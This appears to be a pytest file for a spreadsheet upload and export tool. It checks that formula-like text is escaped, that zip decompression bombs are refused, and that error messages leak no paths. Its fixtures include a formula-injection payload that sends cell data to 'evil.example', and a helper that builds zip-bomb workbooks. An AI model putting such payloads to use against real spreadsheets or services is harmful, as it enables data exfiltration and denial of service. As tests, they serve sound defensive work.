"""Spreadsheet safety (security review 2026-10-13, CONTRACT.md §11, §16, §20):
formula-like text is escaped in every file the tool writes and noted on
upload. Runs on private copies of the tiny store (Tiny-1 / CDSS)."""

from __future__ import annotations

import io

import openpyxl
import pytest
from admin_helpers import ADMIN, TINY_TARGET, notes_by_code, read_csv, template, upload_and_wait, wait, write_csv

from app.importers.spreadsheets import escape_formula, looks_like_formula

HYPERLINK = '=HYPERLINK("https://evil.example/?d="&A1,"Click")'
INCIDENT = {
    "incident_id": "SI-1", "model_version": "Tiny-1", "use_case": "CDSS", "codes": "1A00",
    "incident_type": "Harmful or incorrect recommendation", "harm": "Possible", "status": "Open",
    "source_type": "Incident report", "source_reference": HYPERLINK,
    "reported_date": "2026-09-01", "summary": "@SUM(1+1) synthetic test incident.",
}


def _records(client, kind: str, rows: list[dict]) -> dict:
    response = client.post(f"{ADMIN}/uploads/records", json={"kind": kind, "records": rows})
    assert response.status_code == 202, response.text
    return wait(client, response.json()["upload_id"])


def _publish(client, upload: dict) -> None:
    assert upload["status"] == "valid", upload["report"]
    response = client.post(f"{ADMIN}/uploads/{upload['upload_id']}/publish", json={"previewed": False})
    assert response.status_code == 200, response.text


def _formula_cells(content: bytes) -> list[str]:
    workbook = openpyxl.load_workbook(io.BytesIO(content))  # not read-only: data_type is exact
    return [f"{sheet.title}!{cell.coordinate}" for sheet in workbook for row in sheet.iter_rows() for cell in row if cell.data_type == "f"]


def _cells(content: bytes, sheet: str = "Data") -> list[list]:
    workbook = openpyxl.load_workbook(io.BytesIO(content))
    return [[cell for cell in row] for row in workbook[sheet].iter_rows()]


@pytest.fixture
def published(admin_client):
    upload = _records(admin_client, "safety", [INCIDENT])
    notes = notes_by_code(upload)
    assert notes["formula_like_text"]["count"] == 2  # the source reference and the summary
    assert {example["column"] for example in notes["formula_like_text"]["examples"]} == {"Source reference", "Summary"}
    _publish(admin_client, upload)
    return admin_client


def test_predicates():
    for text in (HYPERLINK, "+1+2", "-2+3", "@SUM(A1)", "\tx", "\rx", "-", "=1"):
        assert looks_like_formula(text) and escape_formula(text) == "'" + text
    for value in ("-0.5", "+3", "-1e-3", "-0,25", "plain", "", None, 0.5, -1, "Age 0-17"):
        assert not looks_like_formula(value) and escape_formula(value) is value


def test_filled_xlsx_template_has_no_formula_cells(published):
    content = template(published, "safety", "xlsx", filled="true")
    assert _formula_cells(content) == []
    rows = _cells(content)
    header = [cell.value for cell in rows[0]]
    reference = rows[1][header.index("Source reference")]
    assert reference.value == "'" + HYPERLINK and reference.data_type == "s"
    assert rows[1][header.index("Summary")].value == "'@SUM(1+1) synthetic test incident."


def test_filled_csv_template_escapes_the_value(published):
    header, rows, _ = read_csv(template(published, "safety", filled="true"))
    assert rows[0][header.index("Source reference")] == "'" + HYPERLINK
    assert rows[0][header.index("Summary")].startswith("'@")


@pytest.mark.parametrize("file_format", ["csv", "xlsx"])
def test_escaped_files_upload_unchanged(published, file_format):
    """Uploads drop the apostrophe again, so a filled template is no change."""
    content = template(published, "safety", file_format, filled="true")
    upload = upload_and_wait(published, "safety", content, filename=f"safety.{file_format}")
    assert upload["status"] == "valid", upload["report"]
    changes = published.get(f"{ADMIN}/uploads/{upload['upload_id']}/changes").json()["rows"]
    assert (changes["added"], changes["changed"], changes["removed"], changes["unchanged"]) == (0, 0, 0, 1)


def test_numbers_stay_numbers_in_filled_xlsx(admin_client):
    content = template(admin_client, "metrics", "xlsx", filled="true", **TINY_TARGET)
    assert _formula_cells(content) == []
    rows = _cells(content)
    header = [cell.value for cell in rows[0]]
    performance = rows[1][header.index("Performance")]
    assert isinstance(performance.value, float) and performance.data_type == "n"


@pytest.mark.parametrize("file_format", ["csv", "xlsx"])
def test_annotated_copies_escape_uploaded_text(admin_client, file_format):
    header, rows, comments = read_csv(template(admin_client, "safety"))
    row = {name: "" for name in header}
    row.update({
        "Incident ID": "=1+1", "Model version": "Tiny-1", "Function": "CDSS", "ICD-11 codes": "1A00",
        "Incident type": "Harmful or incorrect recommendation", "Harm": "Sometimes", "Status": "Open",
        "Source type": "Incident report", "Source reference": HYPERLINK, "Reported date": "2026-09-01",
        "Summary": "-1+2",
    })
    upload = upload_and_wait(admin_client, "safety", write_csv(header, [[row[name] for name in header]], comments))
    assert upload["status"] == "invalid"
    response = admin_client.get(f"{ADMIN}/uploads/{upload['upload_id']}/annotated.{file_format}")
    assert response.status_code == 200, response.text
    if file_format == "xlsx":
        assert _formula_cells(response.content) == []
        cells = _cells(response.content)
        names = [cell.value for cell in cells[0]]
        assert cells[1][names.index("Source reference")].value == "'" + HYPERLINK
        assert cells[1][names.index("Source reference")].data_type == "s"
    else:
        names, annotated, _ = read_csv(response.content)
        assert annotated[0][names.index("Source reference")] == "'" + HYPERLINK
        assert annotated[0][names.index("Incident ID")] == "'=1+1"
        assert annotated[0][names.index("Summary")] == "'-1+2"


# ------------------------------------------------- decompression bombs (§11, §20)

CHUNK = 1024 * 1024


def _workbook_zip(parts: dict[str, int], *, filler=lambda size: b"\0" * size) -> bytes:
    """A zip shaped like an XLSX file whose parts hold ``size`` bytes of ``filler``,
    written in 1 MB chunks (tiny once compressed when the filler is zeros)."""
    from zipfile import ZIP_DEFLATED, ZipFile

    buffer = io.BytesIO()
    with ZipFile(buffer, "w", ZIP_DEFLATED) as archive:
        archive.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types/>')
        for name, size in parts.items():
            with archive.open(name, "w") as part:
                for offset in range(0, size, CHUNK):
                    part.write(filler(min(CHUNK, size - offset)))
    return buffer.getvalue()


def test_archive_check_refuses_bombs_and_oversized_parts():
    from app.importers.spreadsheets import MB, UPLOAD_ARCHIVE_LIMITS, ArchiveLimits, xlsx_archive_problem

    bomb = _workbook_zip({"xl/sharedStrings.xml": 32 * MB})
    assert len(bomb) < 64 * 1024, "the fixture stays tiny"
    assert "compressed more than 100:1" in xlsx_archive_problem(io.BytesIO(bomb), UPLOAD_ARCHIVE_LIMITS)
    # Sizes, checked on random (incompressible) parts against small limits.
    import os

    noise = _workbook_zip({"xl/worksheets/sheet1.xml": 3 * MB, "xl/sharedStrings.xml": 2 * MB}, filler=os.urandom)
    assert xlsx_archive_problem(io.BytesIO(noise), ArchiveLimits(total=8 * MB, whole_part=4 * MB)) is None
    assert "more than 4 MB once opened" in xlsx_archive_problem(io.BytesIO(noise), ArchiveLimits(total=4 * MB, whole_part=4 * MB))
    assert "more than 1 MB once opened" in xlsx_archive_problem(io.BytesIO(noise), ArchiveLimits(total=8 * MB, whole_part=1 * MB))
    # A worksheet is streamed, so only the total limits it.
    sheet_only = _workbook_zip({"xl/worksheets/sheet1.xml": 3 * MB}, filler=os.urandom)
    assert xlsx_archive_problem(io.BytesIO(sheet_only), ArchiveLimits(total=8 * MB, whole_part=1 * MB)) is None
    assert "not a readable Excel workbook" in xlsx_archive_problem(io.BytesIO(b"PK\x03\x04 not a zip"), UPLOAD_ARCHIVE_LIMITS)


def test_real_templates_pass_the_archive_check(admin_client):
    from app.importers.spreadsheets import UPLOAD_ARCHIVE_LIMITS, xlsx_archive_problem

    for kind, params in (("metrics", TINY_TARGET), ("prevalence", {}), ("models", {}), ("safety", {})):
        content = template(admin_client, kind, "xlsx", filled="true", **params)
        assert xlsx_archive_problem(io.BytesIO(content), UPLOAD_ARCHIVE_LIMITS) is None, kind


def test_an_uploaded_bomb_is_unreadable_not_expanded(admin_client):
    bomb = _workbook_zip({"xl/sharedStrings.xml": 32 * 1024 * 1024, "xl/worksheets/sheet1.xml": 8 * 1024 * 1024})
    upload = upload_and_wait(admin_client, "metrics", bomb, filename="metrics.xlsx", **TINY_TARGET)
    assert upload["status"] == "invalid"
    (error,) = upload["report"]["errors"]
    assert error["code"] == "unreadable_file"
    assert "compressed more than 100:1" in error["examples"][0]["problem"]


def test_a_study_bomb_is_refused():
    from app.assist.inputs import InputError, from_file

    bomb = _workbook_zip({"xl/sharedStrings.xml": 32 * 1024 * 1024})
    with pytest.raises(InputError) as refused:
        from_file("study.xlsx", bomb)
    assert refused.value.status == 422 and refused.value.code == "assist_unsupported_input"
    assert "compressed more than 100:1" in refused.value.detail


def test_unreadable_workbook_messages_name_no_paths(tmp_path):
    from app.importers.spreadsheets import UPLOAD_ARCHIVE_LIMITS, UnreadableFile, open_xlsx, xlsx_archive_problem

    missing = tmp_path / "secret-folder" / "gone.xlsx"
    problem = xlsx_archive_problem(missing, UPLOAD_ARCHIVE_LIMITS)
    assert problem.startswith("The file is not a readable Excel workbook") and "secret-folder" not in problem
    with pytest.raises(UnreadableFile) as unreadable:
        open_xlsx(missing)
    assert "secret-folder" not in str(unreadable.value)
